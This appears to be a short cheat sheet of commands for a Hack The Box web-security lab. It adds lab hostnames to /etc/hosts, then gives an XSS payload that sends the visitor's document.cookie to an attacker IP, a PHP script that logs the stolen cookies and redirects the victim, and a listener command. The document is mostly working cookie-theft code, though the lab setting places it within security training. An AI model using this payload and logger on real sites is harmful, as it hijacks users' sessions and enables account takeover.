# Useful Commands

## Add entries to /etc/hosts
```bash
IP=ENTER SPAWNED TARGET IP HERE
printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts
```

## Payload
```js
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.60:8000/log.php?c=' + document.cookie;"></video>
```

## PHP Script
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>

## Listener
```bash
php -S 10.10.15.60:8000
```
